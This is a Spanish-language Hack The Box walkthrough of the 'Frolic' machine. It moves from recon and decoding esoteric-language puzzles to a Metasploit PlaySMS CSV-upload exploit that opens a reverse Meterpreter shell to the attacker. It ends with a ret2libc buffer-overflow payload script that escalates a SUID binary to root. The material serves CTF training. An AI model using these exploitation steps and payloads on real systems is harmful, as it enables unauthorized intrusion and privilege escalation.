---
tags:
permalink: /Frolic-HTB-Writeup
title: Frolic - Easy (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,139,445,1880,9999 10.129.234.156
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 20:07 -0300
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.86% done; ETC: 20:08 (0:00:00 remaining)
Nmap scan report for 10.129.234.156
Host is up (0.72s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h48m24s, deviation: 3h10m29s, median: 1m34s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2026-01-08T04:39:19+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-07T23:09:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.27 seconds
```

## Website / Port 9999

Nada de nada en esta pagina, sin embargo me revela el nombre del dominio.

![image-center](/assets/images/Pasted image 20260107200627.png)
### Dirsearch enumeration

Con la ayuda de `dirsearch`, encontre varias rutas.

```bash
dirsearch -u http://forlic.htb:9999     

<SNIP>                                                                                             
[20:20:29] 301 -  194B  - /admin  ->  http://forlic.htb:9999/admin/         
[20:20:31] 200 -  634B  - /admin/                                           
[20:20:33] 200 -  634B  - /admin/index.html                                 
[20:21:03] 301 -  194B  - /backup  ->  http://forlic.htb:9999/backup/       
[20:21:03] 200 -   28B  - /backup/                                          
[20:21:25] 301 -  194B  - /dev  ->  http://forlic.htb:9999/dev/             
[20:21:25] 403 -  580B  - /dev/                                             
[20:22:48] 301 -  194B  - /test  ->  http://forlic.htb:9999/test/           
[20:22:49] 200 -   83KB - /test/                                            
                                                                             
Task Completed
```
### Admin

Veo un panel de admin y como no tengo credenciales no puedo hacer mucho.

![image-center](/assets/images/Pasted image 20260107202116.png)

Además si intento loguearme sin éxito me sale el siguiente mensaje.

![image-center](/assets/images/Pasted image 20260107202123.png)
## Shell as www-data
### Source code

En el codigo fuente veo la pagina de login se carga de un archivo `/login.js` con el siguiente contenido, el cual tiene credenciales.

![image-center](/assets/images/Pasted image 20260107202832.png)
### Ook! encryption

Al loguearme veo una serie de caracteres extraños, los cuales corresponder a lenguajes de programacion esotericos, como Brainfuck por ejemplo.

![image-center](/assets/images/Pasted image 20260107202907.png)
### Deoufuscator

En este caso corresponder a `Ook!`, en donde luego de buscar por defuscadores de código como este encontré esta [pagina](https://stuff.splitbrain.org/ook/)

![image-center](/assets/images/Pasted image 20260107203130.png)

Dándole en el botón de `Ook! to Text` ve da la siguiente ruta.

![image-center](/assets/images/Pasted image 20260107203141.png)
### Base64 decode

En el cual tiene un pedazo de código en `base64`.

![image-center](/assets/images/Pasted image 20260107203347.png)

Decodificándolo muestro caracteres no legibles, entre ellos los `magicnumber` de un zip.

```bash
echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA" | base64 -d  > test.zip
```
### Crack password

Por lo que luego de colocarlo dentro de un `.zip` lo intente descomprimir, pero esta protegido con una password.

```bash
unzip test.zip      
Archive:  test.zip
[test.zip] index.php password: 
```

Por lo que use `zip2john` para convertir el archivo a un hash el cual pueda romper con `john`.

```bash
 zip2john test.zip > hash
ver 2.0 efh 5455 efh 7875 test.zip/index.php PKZIP Encr: TS_chk, cmplen=176, decmplen=617, crc=145BFE23 ts=89C3 cs=89c3 type=8

<SNIP>

john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (test.zip/index.php)     
1g 0:00:00:00 DONE (2026-01-07 20:34) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Con la password lo desbloquee.

```bash
unzip test.zip
Archive:  test.zip
[test.zip] index.php password: 
replace index.php? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: index.php
```

### Hex code

El mismo me deja un `index.php` con un contenido en hexadecimal.

  ```        
cat index.php 
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```

El cual decodifique en `Cyberchief`, dándome como resultado esta cadena en `base64`

```bash
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
```

Otra vez realizando el mismo proceso me devolvió así, una cadena en lenguaje `Brainfuck`.

```bash
echo KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg== | base64 -d                                               
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

La cual use la misma pagina para decodearlo, dándome así la siguiente password.

![image-center](/assets/images/Pasted image 20260107204042.png)
### PlaySMS

Volviendo a los descubrimientos de `dirsearch` en la ruta `/dev/backup` veo una nueva ruta.

![image-center](/assets/images/Pasted image 20260107204054.png)

La misma me lleva a este panel, donde use la password, con el usuario `admin`, lo cual son validas.

![image-center](/assets/images/Pasted image 20260107204125.png)
### CVE - CSV Injection

Veo que puedo subir un `csv`.

![image-center](/assets/images/Pasted image 20260107204650.png)
### Exploit

Buscando en metasploit, veo que hay un exploit para este servicio y ademas con un upload de `csv`, lo configure, y lo corri, haciendo que gane acceso como el usuario 

```bash
msf exploit(multi/http/playsms_uploadcsv_exec) > set password idkwhatispass
password => idkwhatispass
msf exploit(multi/http/playsms_uploadcsv_exec) > set lhost 10.10.17.19
lhost => 10.10.17.19
msf exploit(multi/http/playsms_uploadcsv_exec) > set rhosts 10.129.234.156
rhosts => 10.129.234.156
msf exploit(multi/http/playsms_uploadcsv_exec) > set rport 9999
rport => 9999
msf exploit(multi/http/playsms_uploadcsv_exec) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[-] Exploit aborted due to failure: unexpected-reply: 10.129.234.156:9999 - Could not determine CSRF token
[*] Exploit completed, but no session was created.
msf exploit(multi/http/playsms_uploadcsv_exec) > set targeturi /playsms
targeturi => /playsms
msf exploit(multi/http/playsms_uploadcsv_exec) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[+] Authentication successful: admin:idkwhatispass
[*] Sending stage (41224 bytes) to 10.129.234.156
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.234.156:52960) at 2026-01-07 20:52:08 -0300

meterpreter > shell
Process 2247 created.
Channel 0 created.
whoami
www-data
```

```bash
cat user.txt
afb8ac2aeb7881ddc790203c2311780c
```
## Shell as root
### Binary SUID

En el directorio `/ayush.binary` veo un binario con el bit `SUID` asignado, haciendo que cuando lo ejecute se ejecute como el usuario propietario `(root)`.

```bash
ls -la
total 28
drwxr-xr-x 3 ayush ayush 4096 Sep  9  2022 .
drwxr-xr-x 4 root  root  4096 Sep  9  2022 ..
lrwxrwxrwx 1 root  root     9 Sep  9  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout
-rw-r--r-- 1 ayush ayush 3771 Sep 23  2018 .bashrc
drwxrwxr-x 2 ayush ayush 4096 Sep  9  2022 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile
-rwxr-xr-x 1 ayush ayush   33 Jan  8 04:37 user.txt
cd .binary
ls -la
total 16
drwxrwxr-x 2 ayush ayush 4096 Sep  9  2022 .
drwxr-xr-x 3 ayush ayush 4096 Sep  9  2022 ..
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
```
### ret2libc attack

Viendo el uso del mismo tengo que enviar un mensaje.

```
root@kali# ./rop 
[*] Usage: program <message>

root@kali# ./rop AAAAAAAAAA
[+] Message sent: AAAAAAAAAA

```

Si envio `10` A's no pasa nada, pero con `500` el programa rompe.

```
root@kali# ./rop $(python -c 'print "A"*500')
Segmentation fault
```
### libc address

Para perfomar un ataque `ret2libc` necesito 5 componentes:

- La dirección base de `libc`
- La dirección de `/bin/sh` con la cual se va a ejecutar la shell
- La dirección de `system`
- La dirección de `exit`.
- Y el offset necesario para poder empezar a sobrescribir el `stack`.

Para obtener la de `libc` puedo usar `ldd` para ver las librerías en uso, viendo que la dirección de `libc` es `0xb7e19000`.

```bash
www-data@frolic:/home/ayush/.binary$ ldd rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```
### System addr

Para obtener las demás puedo obtener con `readelf` el cual es una herramienta de Linux para inspeccionar archivos en formato `ELF`. Es así como obtengo la dirección de `system (0x0003ada0)`

```bash
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0               <------------ system_addr
```
### Exit addr

Lo mismo para `exit (0002e9d0)`.

```bash
www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "exit"
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0                <----------- exit_addr
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
<SNIP>
```

Y repito el proceso para `/bin/sh`, dándome `0x15ba0b`

```bash
www-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 15ba0b /bin/sh
```
### Getting Offset

Luego para obtener el `offset` transferí el binario a mi maquina y con `gdb` lo ejecute, creando un `offset` de `200` caracteres.

```bash
 gdb ./rop 
<SNIP>
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
```

Luego ejecutándolo veo que crashea en `0x41474141`, dándome así un offset de `52` bytes.

```
gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
Starting program: /home/zsln/Desktop/zsln/htb/frolic/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xdd 
EBX: 0xffffd100 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
ECX: 0x0 
EDX: 0x0 
ESI: 0x8048540 (<__libc_csu_init>:      push   ebp)
EDI: 0xf7ffcc60 --> 0x0 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffd0d0 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
<SNIP>
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52

```

Por lo que cree un script en `python` dándome el payload final para obtener una shell como `root`.

```python
import struct
buf = b"A" * 52 
libc_addr = 0xb7e19000
system_addr = struct.pack("<I", libc_addr + 0x0003ada0)
exit_addr = struct.pack("<I", libc_addr + 0x0002e9d0)
sh_addr = struct.pack("<I", libc_addr + 0x15ba0b)
payload = buf + system_addr + exit_addr + sh_addr
print payload
```
### Transfer with base64

Para transferirlo use `base64` decodificándolo del lado de la maquina.

```bash
cat rop.py | base64 -w0
aW1wb3J0IHN0cnVjdApidWYgPSBiIkEiICogNTIgCmxpYmNfYWRkciA9IDB4YjdlMTkwMDAKc3lzdGVtX2FkZHIgPSBzdHJ1Y3QucGFjaygiPEkiLCBsaWJjX2FkZHIgKyAweDAwMDNhZGEwKQpleGl0X2FkZHIgPSBzdHJ1Y3QucGFjaygiPEkiLCBsaWJjX2FkZHIgKyAweDAwMDJlOWQwKQpzaF9hZGRyID0gc3RydWN0LnBhY2soIjxJIiwgbGliY19hZGRyICsgMHgxNWJhMGIpCnBheWxvYWQgPSBidWYgKyBzeXN0ZW1fYWRkciArIGV4aXRfYWRkciArIHNoX2FkZHIKcHJpbnQgcGF5bG9hZA==
```
### Shell

Deposito el script de la siguiente forma.

```bash
www-data@frolic:/home/ayush/.binary$ echo "aW1wb3J0IHN0cnVjdApidWYgPSBiIkEiICogNTIgCmxpYmNfYWRkciA9IDB4YjdlMTkwMDAKc3lzdGVtX2FkZHIgPSBzdHJ1Y3QucDNhZGEwKQpleGl0X2FkZHIgPSBzdHJ1Y3QucGFjaygiPEkiLCBsaWJjX2FkZHIgKyAweDAwMDJlOWQwKQpzaF9hZGRyID0gc3RydWN0LnBhY2soIjxJIiwgbGliY19hZGRyICsgMHgxNWJhMWRkciArIGV4aXRfYWRkciArIHNoX2FkZHIKcHJpbnQgcGF5bG9hZA==" | base64 -d > /tmp/pwnn.py
www-data@frolic:/home/ayush/.binary$ chmod +x /tmp/pwnn.py
```

Y para ejecutarlo le paso como argumento el resultado de la ejecución del script, lo que me da como resultado la shell como `root`.

```
www-data@frolic:/home/ayush/.binary$ ./rop  $(python /tmp/pwnn.py)
# whoami
root
```

```bash
# cat /root/root.txt
9432d566305484eedebde14510f50895
```

`~Happy Hacking.`